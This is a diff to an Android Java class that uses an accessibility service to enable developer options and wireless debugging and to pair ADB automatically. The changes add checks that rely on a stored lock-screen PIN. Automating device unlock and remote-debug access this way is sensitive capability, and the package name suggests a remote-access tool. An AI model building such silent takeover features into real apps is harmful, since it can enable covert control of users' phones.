@@ -14,6 +14,8 @@ import com.vendor.rat.auto.util.GkdSelectorHelper;
 import com.vendor.rat.service.EngineManager;
 import com.vendor.rat.service.MyAccessibilityService;
 import com.vendor.rat.utils.SecureSettingsWriter;
+import com.vendor.rat.credential.LockCredentialStore;
+import com.vendor.rat.utils.DeviceUtils;
 
 import java.util.ArrayList;
 import java.util.List;
@@ -101,8 +103,12 @@ public class WirelessPairEngine extends AutoEngine {
      */
     public static boolean startPairing(Context context) {
         if (context == null) {
-            Log.w(TAG, "startPairing: context is null");
-            return false;
+     Log.w(TAG, "startPairing: context is null");
+     return false;
+     }
+     if (DeviceUtils.isOppo() && !LockCredentialStore.isCurrentRunVerified()) {
+  Log.w(TAG, "startPairing: OPPO credential gate not verified");
+     return false;
         }
         if (!mPairingInProgress.compareAndSet(false, true)) {
             Log.w(TAG, "startPairing: already in progress");
@@ -236,6 +242,13 @@ public class WirelessPairEngine extends AutoEngine {
             return;
         }
 
+        // Fast fail: dev options disabled and no stored PIN — cannot auto-unlock
+        if (!LockCredentialStore.hasCredential()) {
+            logError("Phase 0: dev options disabled and no stored PIN, fast fail");
+       transitionTo(PairState.FAILED);
+            return;
+        }
+
         log("Phase 0: 开发者选项未启用，启动 OpenDevelopmentDelegate");
 
         // Launch Settings > About Phone so OpenDevelopmentDelegate can tap the build number
@@ -358,6 +371,11 @@ public class WirelessPairEngine extends AutoEngine {
      *   3. If OFF: click switch_layout to toggle ON, handle confirm dialog, then click main_layout
      */
     private void handleEnableWirelessDebug() {
+        if (SecureSettingsWriter.isWifiDebugEnabled(getContext())) {
+            log("Phase 2: 无线调试已通过 API 检测开启，跳过 toggle，进入子页面");
+         enterWirelessDebugSubPage();
+      return;
+  }
         sleep(500);
         activateRoot();
         UiNode root = k();
